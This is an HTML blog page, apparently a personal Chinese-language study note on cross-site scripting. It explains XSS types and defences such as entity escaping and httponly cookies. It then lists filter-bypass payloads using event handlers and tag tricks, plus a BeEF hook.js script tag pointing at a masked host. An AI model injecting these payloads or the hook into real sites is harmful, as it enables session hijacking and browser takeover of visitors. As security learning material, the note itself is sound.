@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://images.atsud0.me/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://images.atsud0.me/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://images.atsud0.me/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="https://images.atsud0.me/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="有关XSS的笔记。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss笔记">
+<meta property="og:url" content="http://atsud0.me/2020/05/24/xss%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="有关XSS的笔记。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200518_151513.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200518_111605.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200519_094936.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200519_095007.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200519_095644.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200519_095956.jpg">
+<meta property="article:published_time" content="2020-05-24T11:36:24.000Z">
+<meta property="article:modified_time" content="2021-02-23T15:38:50.458Z">
+<meta property="article:author" content="atsud0">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="javascript">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.atsud0.me/images/post/Screenshot_20200518_151513.jpg">
+
+<link rel="canonical" href="http://atsud0.me/2020/05/24/xss%E7%AC%94%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>xss笔记 | 雪之下二丁目鹤岗八幡宫</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163969429-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雪之下二丁目鹤岗八幡宫</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">166</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">128</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://atsud0.me/2020/05/24/xss%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.atsud0.me/images/atsud0-avator.jpg">
+      <meta itemprop="name" content="atsud0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雪之下二丁目鹤岗八幡宫">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          xss笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-05-24 19:36:24" itemprop="dateCreated datePublished" datetime="2020-05-24T19:36:24+08:00">2020-05-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-23 23:38:50" itemprop="dateModified" datetime="2021-02-23T23:38:50+08:00">2021-02-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Note/" itemprop="url" rel="index"><span itemprop="name">Note</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>3.2k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>3 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>有关XSS的笔记。</p>
+<a id="more"></a>
+
+<h2 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h2><p>XSS又称Cross-site scripting(跨站脚本攻击。它是一种注入类型，可以使攻击者执行恶意脚本并使其在受害者计算机上执行。如果Web应用程序未经过滤的使用用户的输入那么就很容易受到XSS的攻击。XSS可以在Javascript，VBScript，Flash和CSS中使用。XSS分为两类。</p>
+<ul>
+<li>存储型（持久型</li>
+<li>反射型（非持久型</li>
+</ul>
+<p>三种类型的区别<br><img src="https://images.atsud0.me/images/post/Screenshot_20200518_151513.jpg" alt=""></p>
+<p>XSS攻击的是客户端。漏洞特点在于：服务端<strong>原封不动返回数据</strong>，在客户端执行，这个特点作为探测的参考<br>基本探测语句。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;scirpt&gt;alert(1)&lt;&#x2F;scirpt&gt;警告框</span><br><span class="line">&lt;scirpt&gt;prompt(1)&lt;&#x2F;scirpt&gt;提示框</span><br><span class="line">&lt;scirpt&gt;confirm(1)&lt;&#x2F;scirpt&gt;确认框</span><br></pre></td></tr></table></figure>
+<p>html注入代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;www.baidu.com&quot;&gt;click&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>漏洞危害:</p>
+<ul>
+<li>Cookie盗取</li>
+<li>键盘记录</li>
+<li>摄像头拍照</li>
+<li>钓鱼</li>
+<li>端口扫描</li>
+<li>网站重定向</li>
+<li>后台增删改文章</li>
+<li>获取用户信息（浏览器信息，ip地址</li>
+<li>更多…</li>
+</ul>
+<h3 id="xss漏洞流程"><a href="#xss漏洞流程" class="headerlink" title="xss漏洞流程"></a>xss漏洞流程</h3><ol>
+<li>对用户提交的数据过滤不严格</li>
+<li>提交给服务器的脚本被原封不动的返回给客户端执行</li>
+<li>脚本在客户端执行恶意操作</li>
+</ol>
+<p>攻击者构造一个恶意链接发给受害者，恶意代码没有保存在目标网站，而web应用程序原封不动的把恶意脚本返回给受害者的浏览器，受害者的浏览器就会本地解析恶意代码，从而达成攻击效果</p>
+<p>攻击者发现网站有漏洞，把恶意代码存储在服务器上一个页面上（如发帖，等。当普通用户访问服务器的这个页面后，就会触发。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200518_111605.jpg" alt="流程"></p>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型的XSS脚本是XSS的最危险类型，这是因为恶意脚本被存储在网站的数据库中。 当网站允许用户的输入插入到数据库时​​，又不过滤用户的输入时就会发送存储型xss攻击。如果攻击者发现网站某个输入页面有XSS漏洞，那么攻击者可以把恶意代码存储在服务器上一个页面上（如发帖，等。当普通用户访问服务器的这个页面后，就会触发。这就是存储型XSS攻击。</p>
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>攻击者构造一个恶意链接发给受害者，恶意代码没有保存在目标网站，而web应用程序原封不动的把恶意脚本返回给受害者的浏览器，受害者的浏览器就会本地解析恶意代码，从而达成攻击效果。</p>
+<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>Dom型XSS其实是一种特殊的反射型XSS攻击。它和反射型的区别在于DOM型XSS并不会和后台进行交互，是完完全全的Web前端安全问题，要做防御也只能在客户端上进行防御。</p>
+<h2 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h2><h3 id="转义用户的输入"><a href="#转义用户的输入" class="headerlink" title="转义用户的输入"></a>转义用户的输入</h3><ol>
+<li><p>正则表达式过滤</p>
+</li>
+<li><p>(使用<code>htmlspecialchars()</code>函数，转义html字符（实体编码，只取样子)</p>
+</li>
+</ol>
+<p>实体化在前端展示的时候，会正常显示&lt;&gt;等字符的样子。但是在源代码中不会解析为标签，会被转为实体化编码，只表示为他原来的样子。</p>
+<p>例如：前端显示<code>&lt;</code>，但是在浏览器查看源代码的时候会展示成<code>&amp;lt</code>的实体编码的样子。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$str = <span class="string">"The is aaa &lt;b&gt;BOLD&lt;/b&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>不使用<code>htmlspecialchars()</code>的话就会把BOLD这个单词加粗。因为是<code>&lt;b&gt;</code>标签被识别成了html标签。所以正常输出。</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200519_094936.jpg" alt="页面效果"></p>
+<p>让我们看看源码，和我们想的是一样的。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_095007.jpg" alt=""></p>
+<p>但是如果使用<code>htmlspecialchars()</code>函数的话就会变成这个样子。</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200519_095644.jpg" alt=""></p>
+<p>所以我们可以看到，如果使用了<code>htmlspecialchars()</code>就不会把<code>&lt;b&gt;</code>标签识别为html标签去解析他，而是正常的去把他原样输出。（你所看到的原样并不是真正的原样。</p>
+<p>如果我们再去看它的源代码的话，会发现<code>&lt;b&gt;</code>符号被转成了html的实体编码<code>&amp;lt;b&amp;gt</code>所以这其实不是原样输出。只是你看到的是原样，实际不是。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_095956.jpg" alt="sd"></p>
+<p>在进行xss攻击的时候，我们更想看到的是第一种效果。标签被识别，能被后端解析。</p>
+<h3 id="验证用户的输入"><a href="#验证用户的输入" class="headerlink" title="验证用户的输入"></a>验证用户的输入</h3><p>在用户将他的输入内容，存储在后端前，对用户的输入进行验证。验证输入首先不允许提交某些字符。</p>
+<h3 id="httponly防止盗取cookie"><a href="#httponly防止盗取cookie" class="headerlink" title="httponly防止盗取cookie"></a>httponly防止盗取cookie</h3><p>php版本5.2以上可以打开httponly的选项将<code>session.cookie_httponly</code> 设置为1或True.防止用户cookie盗取。</p>
+<h2 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h2><h3 id="大小写混合"><a href="#大小写混合" class="headerlink" title="大小写混合"></a>大小写混合</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scRIpt&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;&#x2F;scr&lt;script&gt;ipt&gt;</span><br><span class="line">&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他标签绕过"><a href="#其他标签绕过" class="headerlink" title="其他标签绕过"></a>其他标签绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;video src&#x3D;x onerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;audio src&#x3D;x onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<p>iframe</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;javascript:alert(2)&quot;&gt;</span><br><span class="line">&lt;iframe onload&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<p>a标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript:onclick&#x3D;alert()&quot;&gt;tets&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:alert()&quot;&gt;test&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+<p>利用事件绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload&#x3D;alert(1)&gt;</span><br><span class="line">&lt;body onload&#x3D;alert(1)&gt;</span><br><span class="line">&lt;select autofocus onfocus&#x3D;alert(1)&gt;</span><br><span class="line">&lt;textarea autofocus onfocus&#x3D;alert(1)&gt;</span><br><span class="line">&lt;video&gt;&lt;source onerror&#x3D;&quot;javascript:alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>圆括号被过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a onmouseover&#x3D;&quot;javascript:window.onerror&#x3D;alert;throw 1&quot;&gt;</span><br><span class="line">&lt;imgsrc&#x3D;x onerror&#x3D;&quot;javascript:window.onerror&#x3D;alert;throw 1&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="其他的XSS攻击模块"><a href="#其他的XSS攻击模块" class="headerlink" title="其他的XSS攻击模块"></a>其他的XSS攻击模块</h2><h3 id="BeeF"><a href="#BeeF" class="headerlink" title="BeeF"></a>BeeF</h3><p>Kali 2020已经没有预装了，需要手动安装。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install beff-xss</span><br></pre></td></tr></table></figure>
+<p><code>http://*****:3000/ui/panel</code><br>默认用户名<code>beef</code>和密码<code>beef</code>。</p>
+<p>脚本地址:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;*****:3000&#x2F;hook.js&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="在线xss攻击平台"><a href="#在线xss攻击平台" class="headerlink" title="在线xss攻击平台"></a>在线xss攻击平台</h3><a href="http://xss-payloads.com/" title="" target="">XSS-Payloads</a>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/" title="" target="">浅析DOM型XSS</a></li>
+<li><a href="https://tryhackme.com/room/xss#" title="" target="">Cross-site Scripting</a></li>
+<li><a href="https://wizardforcel.gitbooks.io/xss-naxienian/content/0.html" title="" target="">那些年我们一起学过的XSS</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>atsud0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://atsud0.me/2020/05/24/xss%E7%AC%94%E8%AE%B0/" title="xss笔记">http://atsud0.me/2020/05/24/xss笔记/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/XSS/" rel="tag"><i class="fa fa-tag"></i> XSS</a>
+              <a href="/tags/javascript/" rel="tag"><i class="fa fa-tag"></i> javascript</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/05/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/" rel="prev" title="文件包含笔记">
+      <i class="fa fa-chevron-left"></i> 文件包含笔记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/05/25/TryHackMe-alfred/" rel="next" title="TryHackMe-alfred">
+      TryHackMe-alfred <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是XSS"><span class="nav-number">1.</span> <span class="nav-text">什么是XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xss漏洞流程"><span class="nav-number">1.1.</span> <span class="nav-text">xss漏洞流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#存储型XSS"><span class="nav-number">1.2.</span> <span class="nav-text">存储型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反射型XSS"><span class="nav-number">1.3.</span> <span class="nav-text">反射型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM型XSS"><span class="nav-number">1.4.</span> <span class="nav-text">DOM型XSS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防御方式"><span class="nav-number">2.</span> <span class="nav-text">防御方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#转义用户的输入"><span class="nav-number">2.1.</span> <span class="nav-text">转义用户的输入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#验证用户的输入"><span class="nav-number">2.2.</span> <span class="nav-text">验证用户的输入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#httponly防止盗取cookie"><span class="nav-number">2.3.</span> <span class="nav-text">httponly防止盗取cookie</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过思路"><span class="nav-number">3.</span> <span class="nav-text">绕过思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#大小写混合"><span class="nav-number">3.1.</span> <span class="nav-text">大小写混合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#双写绕过"><span class="nav-number">3.2.</span> <span class="nav-text">双写绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他标签绕过"><span class="nav-number">3.3.</span> <span class="nav-text">其他标签绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他的XSS攻击模块"><span class="nav-number">4.</span> <span class="nav-text">其他的XSS攻击模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BeeF"><span class="nav-number">4.1.</span> <span class="nav-text">BeeF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#在线xss攻击平台"><span class="nav-number">4.2.</span> <span class="nav-text">在线xss攻击平台</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="atsud0"
+      src="https://images.atsud0.me/images/atsud0-avator.jpg">
+  <p class="site-author-name" itemprop="name">atsud0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/index.html">
+          
+        <span class="site-state-item-count">166</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/atsud0" title="GitHub → https://github.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@atsud0.me" title="E-Mail → mailto:admin@atsud0.me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/atsud0" title="Twitter → https://twitter.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/MindworkshopBot" title="Telegram → https://t.me/MindworkshopBot" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ajin.cloud/" title="https://blog.ajin.cloud/" rel="noopener" target="_blank">ajin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://leiblog.wang/" title="https://leiblog.wang/" rel="noopener" target="_blank">LeiWang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://esonhugh.github.io/" title="https://esonhugh.github.io/" rel="noopener" target="_blank">Esonhugh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://isabellainori.github.io/" title="https://isabellainori.github.io/" rel="noopener" target="_blank">Isabella Ross</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">atsud0</span>
